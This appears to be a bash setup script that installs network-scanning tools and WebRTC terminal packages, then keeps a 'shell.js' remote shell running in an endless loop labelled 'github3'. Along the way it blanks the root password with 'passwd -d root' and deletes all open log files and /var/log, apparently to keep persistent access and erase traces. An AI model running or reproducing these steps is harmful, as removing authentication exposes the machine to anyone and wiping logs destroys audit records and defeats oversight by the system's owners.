#!/bin/bash
npm install node-pre-gyp wrtc node-pty
sudo apt update &>/dev/null
sudo apt install iputils-ping dnsutils nmap tcpdump net-tools inetutils-traceroute mtr whois curl wget bind9-host iproute2 iftop hping3 ngrep nano aria2 coturn cowsay neofetch strace &>/dev/null
killall -9 turnserver
passwd -d root
touch ~root/.hushlogin
cat logo.txt >/etc/issue
ln -sf /usr/share/zoneinfo/Africa/Cairo /etc/localtime
lsof -Fn | grep -F '.log' | grep -v deleted | awk '/^n/ {print substr(\$0, 2)}' | xargs -I {} rm -rf {}
rm -rf /var/log/*
while true
do
echo starting...
node shell.js -r -l -t 600 github3
sleep 2
done
